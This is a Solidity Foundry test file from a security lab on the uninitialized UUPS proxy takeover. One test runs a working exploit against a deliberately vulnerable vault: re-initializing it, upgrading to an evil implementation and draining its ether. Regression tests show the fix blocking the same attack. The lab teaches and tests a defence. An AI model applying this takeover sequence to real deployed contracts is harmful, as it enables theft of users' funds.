// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Erc1967Proxy} from "../src/Erc1967Proxy.sol";
import {VulnerableUupsVault, EvilUupsImplementation} from "../src/VulnerableUupsVault.sol";
import {SafeUupsVault} from "../src/SafeUupsVault.sol";

/// @title UupsTakeover.t.sol
/// @notice Lab 14 — Exploit + regression tests for the uninitialized
///         UUPS proxy takeover.
///
/// Lab: Unguarded initializer on an upgradeable vault
///
/// Threat model:
///   The vault's `initialize()` has no one-shot guard, and the implementation
///   constructor does not lock its own storage. Deploying the proxy and
///   initializing it in separate transactions leaves a window — minutes or
///   forever — where `owner` is unset and `initialize` is callable by anyone.
///   A frontrunner or scanner becomes the owner, upgrades to arbitrary logic,
///   and drains the proxy.
///
/// Violated invariant:
///   "Privileged protocol state must be established exactly once, atomically
///   with deployment, by the deployer."
///
/// Remediation (see SafeUupsVault):
///   An `initialized` flag makes the initializer one-shot, the constructor
///   locks the implementation's own storage, and the proxy is initialized
///   atomically in its creation transaction.
///
/// Regression tests:
///   The same attack against the safe deployment reverts at both steps, and
///   the raw implementation can never be initialized by anyone.
contract UupsTakeoverTest is Test {
    address internal deployer;
    address internal attacker;

    uint256 internal constant PROXY_FUNDING = 10 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
    }

    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function testProxyRejectsEmptyInitialization() public {
        SafeUupsVault impl = new SafeUupsVault();
        vm.expectRevert(bytes("empty init data"));
        new Erc1967Proxy(address(impl), "");
    }

    function testProxyChecksCodeBeforeInitData() public {
        vm.expectRevert(bytes("no code"));
        new Erc1967Proxy(deployer, "");
    }

    function testInitializerSeesImplementationSlot() public {
        VaultV2 impl = new VaultV2();
        Erc1967Proxy proxy =
            new Erc1967Proxy(address(impl), abi.encodeCall(VaultV2.checkImplementation, (address(impl))));
        assertEq(vm.load(address(proxy), IMPLEMENTATION_SLOT), bytes32(uint256(uint160(address(impl)))));
    }

    function testProxyBubblesInitializerError() public {
        VaultV2 impl = new VaultV2();
        vm.expectRevert(abi.encodeWithSelector(VaultV2.UnexpectedImplementation.selector, address(impl)));
        new Erc1967Proxy(address(impl), abi.encodeCall(VaultV2.checkImplementation, (address(0))));
    }

    function testProxyRejectsZeroOwner() public {
        SafeUupsVault impl = new SafeUupsVault();
        vm.expectRevert(bytes("zero owner"));
        new Erc1967Proxy(address(impl), abi.encodeCall(SafeUupsVault.initialize, (address(0))));
    }

    function testImplementationRejectsDirectUpgrade() public {
        SafeUupsVault impl = new SafeUupsVault();
        SafeUupsVault next = new SafeUupsVault();
        assertEq(impl.proxiableUUID(), IMPLEMENTATION_SLOT);
        vm.expectRevert(bytes("not delegated"));
        impl.upgradeToAndCall(address(next), "");
    }

    function testOwnerCanUpgradeAndPreserveState() public {
        (Erc1967Proxy proxy, SafeUupsVault vault) = _deployVault();
        VaultV2 next = new VaultV2();
        vm.prank(deployer);
        vault.upgradeToAndCall(address(next), abi.encodeCall(VaultV2.setVersion, (2)));

        assertEq(vault.owner(), deployer);
        assertTrue(vault.initialized());
        assertEq(address(proxy).balance, PROXY_FUNDING);
        assertEq(VaultV2(payable(address(proxy))).version(), 2);

        SafeUupsVault third = new SafeUupsVault();
        vm.prank(deployer);
        vault.upgradeToAndCall(address(third), "");
        assertEq(vm.load(address(proxy), IMPLEMENTATION_SLOT), bytes32(uint256(uint160(address(third)))));
    }

    function testOwnerCannotUpgradeToIncompatibleTargets() public {
        (Erc1967Proxy proxy, SafeUupsVault vault) = _deployVault();
        bytes32 original = vm.load(address(proxy), IMPLEMENTATION_SLOT);
        WrongUuid wrong = new WrongUuid();
        MissingUuid missing = new MissingUuid();

        vm.startPrank(deployer);
        vm.expectRevert(bytes("no code"));
        vault.upgradeToAndCall(deployer, "");
        vm.expectRevert(bytes("incompatible implementation"));
        vault.upgradeToAndCall(address(missing), "");
        vm.expectRevert(bytes("incompatible implementation"));
        vault.upgradeToAndCall(address(wrong), "");
        vm.expectRevert(bytes("delegated UUID"));
        vault.proxiableUUID();
        vm.expectRevert(bytes("incompatible implementation"));
        vault.upgradeToAndCall(address(proxy), "");
        vm.stopPrank();

        assertEq(vm.load(address(proxy), IMPLEMENTATION_SLOT), original);
    }

    function testUpgradeCallFailureBubblesErrorAndRollsBack() public {
        (Erc1967Proxy proxy, SafeUupsVault vault) = _deployVault();
        bytes32 original = vm.load(address(proxy), IMPLEMENTATION_SLOT);
        VaultV2 next = new VaultV2();
        vm.prank(deployer);
        vm.expectRevert(abi.encodeWithSelector(VaultV2.UnexpectedImplementation.selector, address(next)));
        vault.upgradeToAndCall(address(next), abi.encodeCall(VaultV2.checkImplementation, (address(0))));
        assertEq(vm.load(address(proxy), IMPLEMENTATION_SLOT), original);
    }

    function _deployVault() internal returns (Erc1967Proxy proxy, SafeUupsVault vault) {
        SafeUupsVault impl = new SafeUupsVault();
        proxy = new Erc1967Proxy(address(impl), abi.encodeCall(SafeUupsVault.initialize, (deployer)));
        vm.deal(address(proxy), PROXY_FUNDING);
        vault = SafeUupsVault(payable(address(proxy)));
    }

    function testVulnerableProxyCanBeTakenOverAndDrained() public {
        VulnerableUupsVault impl = new VulnerableUupsVault();
        Erc1967Proxy proxy = new Erc1967Proxy(address(impl), abi.encodeCall(VulnerableUupsVault.initialize, (deployer)));
        vm.deal(address(proxy), PROXY_FUNDING);
        VulnerableUupsVault vault = VulnerableUupsVault(payable(address(proxy)));

        assertEq(vault.owner(), deployer);

        // The unguarded initializer permits ownership reassignment after
        // legitimate initialization, so the attacker can take over the proxy.
        vm.prank(attacker);
        vault.initialize(attacker);
        assertEq(vault.owner(), attacker);

        EvilUupsImplementation evil = new EvilUupsImplementation();
        vm.prank(attacker);
        vault.upgradeToAndCall(address(evil), abi.encodeCall(EvilUupsImplementation.drain, (payable(attacker))));

        assertEq(address(proxy).balance, 0);
        assertEq(attacker.balance, PROXY_FUNDING);
    }

    function testSafeProxyInitializationIsAtomicAndLocked() public {
        SafeUupsVault impl = new SafeUupsVault();

        // Correct posture: initialize inside the creation transaction.
        vm.prank(deployer);
        Erc1967Proxy proxy = new Erc1967Proxy(address(impl), abi.encodeCall(SafeUupsVault.initialize, (deployer)));
        vm.deal(address(proxy), PROXY_FUNDING);

        // Takeover of the proxy fails: already initialized.
        vm.prank(attacker);
        vm.expectRevert();
        SafeUupsVault(payable(address(proxy))).initialize(attacker);

        // Takeover of the raw implementation fails: locked in its constructor.
        vm.prank(attacker);
        vm.expectRevert();
        impl.initialize(attacker);

        // Upgrade attempts by the attacker revert at the owner gate.
        EvilUupsImplementation evil = new EvilUupsImplementation();
        vm.prank(attacker);
        vm.expectRevert();
        SafeUupsVault(payable(address(proxy)))
            .upgradeToAndCall(address(evil), abi.encodeCall(EvilUupsImplementation.drain, (payable(attacker))));

        assertEq(address(proxy).balance, PROXY_FUNDING, "funds untouched");
    }
}

contract VaultV2 is SafeUupsVault {
    error UnexpectedImplementation(address actual);

    uint256 public version;

    function setVersion(uint256 version_) external onlyOwner {
        version = version_;
    }

    function checkImplementation(address expected) external view {
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address actual;
        assembly {
            actual := sload(slot)
        }
        if (actual != expected) revert UnexpectedImplementation(actual);
    }
}

contract WrongUuid {
    function proxiableUUID() external pure returns (bytes32) {
        return bytes32(0);
    }
}

contract MissingUuid {}
